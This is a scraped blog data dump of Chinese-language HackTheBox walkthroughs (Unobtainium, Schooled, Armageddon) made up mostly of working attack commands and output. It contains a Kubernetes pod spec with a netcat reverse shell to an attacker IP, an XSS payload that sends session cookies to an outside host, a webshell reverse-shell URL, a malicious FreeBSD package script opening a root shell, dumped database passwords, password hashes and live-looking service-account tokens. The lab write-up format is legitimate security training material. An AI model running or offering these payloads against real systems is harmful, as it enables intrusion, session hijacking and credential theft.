eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw auth can-i --list Resources Non-Resource URLs Resource Names Verbsselfsubjectaccessreviews.authorization.k8s.io [] [] [create]selfsubjectrulesreviews.authorization.k8s.io [] [] [create]secrets [] [] [get list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] secrets获取secrets，其中daemon-set-controller有create pod权限： DaemonSet | Kuberneteshttps://kubernetes.io/docs/concepts/workloads/controllers/daemonset/ 1234567891011121314151617181920212223242526272829303132333435363738./kubectl --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw -n kube-system get secretsNAME TYPE DATA AGEattachdetach-controller-token-5dkkr kubernetes.io/service-account-token 3 86dbootstrap-signer-token-xl4lg kubernetes.io/service-account-token 3 86dc-admin-token-tfmp2 kubernetes.io/service-account-token 3 86dcertificate-controller-token-thnxw kubernetes.io/service-account-token 3 86dclusterrole-aggregation-controller-token-scx4p kubernetes.io/service-account-token 3 86dcoredns-token-dbp92 kubernetes.io/service-account-token 3 86dcronjob-controller-token-chrl7 kubernetes.io/service-account-token 3 86ddaemon-set-controller-token-cb825 kubernetes.io/service-account-token 3 86ddefault-token-l85f2 kubernetes.io/service-account-token 3 86ddeployment-controller-token-cwgst kubernetes.io/service-account-token 3 86ddisruption-controller-token-kpx2x kubernetes.io/service-account-token 3 86dendpoint-controller-token-2jzkv kubernetes.io/service-account-token 3 86dendpointslice-controller-token-w4hwg kubernetes.io/service-account-token 3 86dendpointslicemirroring-controller-token-9qvzz kubernetes.io/service-account-token 3 86dexpand-controller-token-sc9fw kubernetes.io/service-account-token 3 86dgeneric-garbage-collector-token-2hng4 kubernetes.io/service-account-token 3 86dhorizontal-pod-autoscaler-token-6zhfs kubernetes.io/service-account-token 3 86djob-controller-token-h6kg8 kubernetes.io/service-account-token 3 86dkube-proxy-token-jc8kn kubernetes.io/service-account-token 3 86dnamespace-controller-token-2klzl kubernetes.io/service-account-token 3 86dnode-controller-token-k6p6v kubernetes.io/service-account-token 3 86dpersistent-volume-binder-token-fd292 kubernetes.io/service-account-token 3 86dpod-garbage-collector-token-bjmrd kubernetes.io/service-account-token 3 86dpv-protection-controller-token-9669w kubernetes.io/service-account-token 3 86dpvc-protection-controller-token-w8m9r kubernetes.io/service-account-token 3 86dreplicaset-controller-token-bzbt8 kubernetes.io/service-account-token 3 86dreplication-controller-token-jz8k8 kubernetes.io/service-account-token 3 86dresourcequota-controller-token-wg7rr kubernetes.io/service-account-token 3 86droot-ca-cert-publisher-token-cnl86 kubernetes.io/service-account-token 3 86dservice-account-controller-token-44bfm kubernetes.io/service-account-token 3 86dservice-controller-token-pzjnq kubernetes.io/service-account-token 3 86dstatefulset-controller-token-z2nsd kubernetes.io/service-account-token 3 86dstorage-provisioner-token-tk5k5 kubernetes.io/service-account-token 3 86dtoken-cleaner-token-wjvf9 kubernetes.io/service-account-token 3 86dttl-controller-token-z87px kubernetes.io/service-account-token 3 86d daemon-set token获取daemon-set token： 123456789101112131415./kubectl --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw -n kube-system describe secrets daemon-set-controller-token-cb825Name: daemon-set-controller-token-cb825Namespace: kube-systemLabels: &lt;none&gt;Annotations: kubernetes.io/service-account.name: daemon-set-controller kubernetes.io/service-account.uid: 58a5014a-5be1-4144-8256-ebbe3b0d3effType: kubernetes.io/service-account-tokenData====ca.crt: 1066 bytesnamespace: 11 bytestoken: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg images1./kubectl get pods --all-namespaces --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg -o json evil pod之后就是使用daemon-set token创建恶意pod，执行命令： 1./kubectl create -f ./pod.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg pod.yaml12345678910111213141516171819apiVersion: v1kind: Podmetadata: name: some-pod namespace: defaultspec: containers: - name: web image: localhost:5000&#x2F;dev-alpine command: [&quot;&#x2F;bin&#x2F;sh&quot;] args: [&quot;-c&quot;, &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.7 4446 &gt;&#x2F;tmp&#x2F;f; sleep 100000&#39;] volumeMounts: - mountPath: &#x2F;root&#x2F; name: root-flag volumes: - hostPath: path: &#x2F;root&#x2F; type: &quot;&quot; name: root-flag root创建pod会执行我们的命令，得到root flag： 参考资料 lodash@4.17.4 vulnerabilities | lodash 4.17.4 | Snykhttps://snyk.io/test/npm/lodash/4.17.4 Install and Set Up kubectl on Linux | Kuberneteshttps://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux DaemonSet | Kuberneteshttps://kubernetes.io/docs/concepts/workloads/controllers/daemonset/ Unobtainium User - Page 2 | RaidForumshttps://raidforums.com/Thread-Tutorial-Unobtainium-User?page=2 Unobtainium root steps | RaidForumshttps://raidforums.com/Thread-Tutorial-Unobtainium-root-steps","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Schooled - HackTheBox","slug":"Schooled-HackTheBox","date":"2021-04-10T07:04:41.000Z","updated":"2021-09-13T01:00:33.809Z","comments":true,"path":"2021/04/10/Schooled-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/04/10/Schooled-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/335 10.10.10.234 端口扫描22和80: 12345678910111213141516171819202122232425$ nmap -sC -sV 10.10.10.234Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 12:47 CSTNmap scan report for 10.10.10.234Host is up (0.31s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)| ssh-hostkey:| 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)| 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)|_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)42/tcp filtered nameserver80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15|_http-title: Schooled - A new kind of educational institute2007/tcp filtered dectalk3814/tcp filtered neto-dcs6005/tcp filtered X11:59102/tcp filtered jetdirectService Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 112.83 seconds 80一个教育相关的，得到部分用户名和域名信息： 子域名加hosts后枚举子域名,然后结果也加hosts： 12345678910.10.10.234 schooled.htb➜ ~ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb' -fs 20750 -smoodle➜ ~ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb' -fs 20750moodle [Status: 200, Size: 84, Words: 5, Lines: 2]10.10.10.234 schooled.htb moodle.schooled.htb moodle.schooled.htb有注册登录，注册需要特定邮箱地址： 注册后直接continue验证： moodlemoodle搜到提权漏洞，但首先我们需要成为teather： HoangKien1020/CVE-2020-14321: Course enrolments allowed privilege escalation from teacher role into manager role to RCEhttps://github.com/HoangKien1020/CVE-2020-14321 xss个人资料那里可以xss,能够xss打到教师cookie,，在线用户找到教师加入他的课然后给他发消息等他查看触发: 1&lt;img src=x onerror=this.src='http://10.10.14.3:7777/?'+document.cookie;&gt; 110.10.10.234 - - [10&#x2F;Apr&#x2F;2021 13:36:27] &quot;GET &#x2F;?MoodleSession&#x3D;1r1ap6bt4djeq5veh0vnbiu4ng HTTP&#x2F;1.1&quot; 200 - 之后修改cookie，现在我们是教师： to manager从前面可以知道manager的名字： 然后就是一步步来，成为manager： full permissions之后得到全部权限，包括插件： webshell恶意插件可以从这里下载： https://github.com/HoangKien1020/Moodle_RCE 一步步安装，得到webshell： reverse shell1234http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 10.10.14.3 4444 &gt;/tmp/fexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binpython3 -c 'import pty;pty.spawn(\"/bin/bash\")' mysql然后config里得到mysql密码，mysql里得到用户hash： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970$ cat config.php&lt;?php // Moodle configuration fileunset($CFG);global $CFG;$CFG = new stdClass();$CFG-&gt;dbtype = 'mysqli';$CFG-&gt;dblibrary = 'native';$CFG-&gt;dbhost = 'localhost';$CFG-&gt;dbname = 'moodle';$CFG-&gt;dbuser = 'moodle';$CFG-&gt;dbpass = 'PlaybookMaster2020';$CFG-&gt;prefix = 'mdl_';$CFG-&gt;dboptions = array ( 'dbpersist' =&gt; 0, 'dbport' =&gt; 3306, 'dbsocket' =&gt; '', 'dbcollation' =&gt; 'utf8_unicode_ci',);$CFG-&gt;wwwroot = 'http://moodle.schooled.htb/moodle';$CFG-&gt;dataroot = '/usr/local/www/apache24/moodledata';$CFG-&gt;admin = 'admin';$CFG-&gt;directorypermissions = 0777;require_once(__DIR__ . '/lib/setup.php');// There is no php closing tag in this file,// it is intentional because it prevents trailing whitespace problems!$ pwd/usr/local/www/apache24/data/moodle[www@Schooled /usr/local/www/apache24/data/moodle]$ mysql -u moodle -pPlaybookMaster2020 -e 'use moodle;select username,password from mdl_user;'&lt;use moodle;select username,password from mdl_user;'mysql: [Warning] Using a password on the command line interface can be insecure.+-------------------+--------------------------------------------------------------+| username | password |+-------------------+--------------------------------------------------------------+| guest | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 || admin | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW || bell_oliver89 | $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK || orchid_sheila89 | $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC || chard_ellzabeth89 | $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC || morris_jake89 | $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy || heel_james89 | $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim || nash_michael89 | $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu || singh_rakesh89 | $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu || taint_marcus89 | $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa || walls_shaun89 | $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga || smith_john89 | $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em || white_jack89 | $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK || travis_carl89 | $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S || mac_amy89 | $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i || james_boris89 | $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq || pierce_allan | $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy || henry_william89 | $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu || harper_zoe89 | $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy || wright_travis89 | $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm || allen_matthew89 | $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq || sanders_wallis89 | $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u || higgins_jane | $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 || phillips_manuel | $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG || carter_lianne | $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe || parker_dan89 | $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi || parker_tim89 | $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S || miao | $2y$10$dtX5uIZeakEQQ4C9DClQBOJXHiCc7x/5XwbdARSxV9FPrzciGsMv. || miao1 | $2y$10$aMIdkU.fnrr4E/e9bkQCaebfF9gK1zA73DnN1P2AOBmkQ3NwmyNlC |+-------------------+--------------------------------------------------------------+ hash crack可以破解出来admin的密码： 12345678910111213➜ Desktop sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status!QAZ2wsx (?)1g 0:00:02:33 DONE (2021-04-09 04:10) 0.006496g/s 90.26p/s 90.26c/s 90.26C/s 110689..superpetUse the \"--show\" option to display all of the cracked passwords reliablySession completed!QAZ2wsx user flag根据前面的信息，Jamie是Information Technology Lecturer，查看用户也有jamie用户，可以直接使用破解出来的密码ssh登录： 提权信息1234jamie@Schooled:~ $ sudo -lUser jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install * Creating Custom Packages on FreeBSD | lastsummer.dehttp://lastsummer.de/creating-custom-packages-on-freebsd/ 提权 &amp; root flag自定义pkg，安装的时候会执行里面的命令，得到root shell： exp.sh123456789101112131415161718192021222324#!/bin/shSTAGEDIR=/tmp/packagerm -rf $&#123;STAGEDIR&#125;mkdir -p $&#123;STAGEDIR&#125;cat &gt;&gt; $&#123;STAGEDIR&#125;/+PRE_INSTALL &lt;&lt;EOFecho \"Resetting root shell\"rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/aEOFcat &gt;&gt; $&#123;STAGEDIR&#125;/+POST_INSTALL &lt;&lt;EOFecho \"Registering root shell\"pw usermod -n root -s /bin/shEOFcat &gt;&gt; $&#123;STAGEDIR&#125;/+MANIFEST &lt;&lt;EOFname: mypackageversion: \"1.0_5\"origin: sysutils/mypackagecomment: \"utomates stuff\"desc: \"automates tasks which can also be undone later\"maintainer: john@doe.itwww: https://doe.itprefix: /EOFpkg create -m $&#123;STAGEDIR&#125;/ -r $&#123;STAGEDIR&#125;/ -o . 参考资料 moodle RCE | #CVE-2020-14321 PoC - YouTube https://www.youtube.com/watch?v=BkEInFI4oIU&amp;ab_channel=RapidSafeGuard HoangKien1020/CVE-2020-14321: Course enrolments allowed privilege escalation from teacher role into manager role to RCEhttps://github.com/HoangKien1020/CVE-2020-14321 https://github.com/HoangKien1020/Moodle_RCE Creating Custom Packages on FreeBSD | lastsummer.dehttp://lastsummer.de/creating-custom-packages-on-freebsd/ Schooled Htb Writeuphttps://0xsakthi.blogspot.com/2021/04/schooled-htb-writeup.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Armageddon - HackTheBox","slug":"Armageddon-HackTheBox","date":"2021-03-29T06:42:29.000Z","updated":"2021-07-26T06:21:30.508Z","comments":true,"path":"2021/03/29/Armageddon-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/03/29/Armageddon-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/323 10.10.10.233 端口扫描22和80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.10.233Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 13:55 CSTNmap scan report for 10.10.10.233Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt|_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Welcome to Armageddon | ArmageddonService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds 8080是Arnageddon,基于drupal7： Drupal7 exploit简单搜索，相关漏洞： Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - ‘Drupalgeddon2’ Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/44449 exploitmsf有模块，一键打： 信息搜集setting里得到mysql的用户名密码： 123456789101112131415$databases &#x3D; array ( &#39;default&#39; &#x3D;&gt; array ( &#39;default&#39; &#x3D;&gt; array ( &#39;database&#39; &#x3D;&gt; &#39;drupal&#39;, &#39;username&#39; &#x3D;&gt; &#39;drupaluser&#39;, &#39;password&#39; &#x3D;&gt; &#39;CQHEy@9M*m23gBVj&#39;, &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;, &#39;port&#39; &#x3D;&gt; &#39;&#39;, &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;, &#39;prefix&#39; &#x3D;&gt; &#39;&#39;, ), ),); mysql直接切到shell查询mysql： 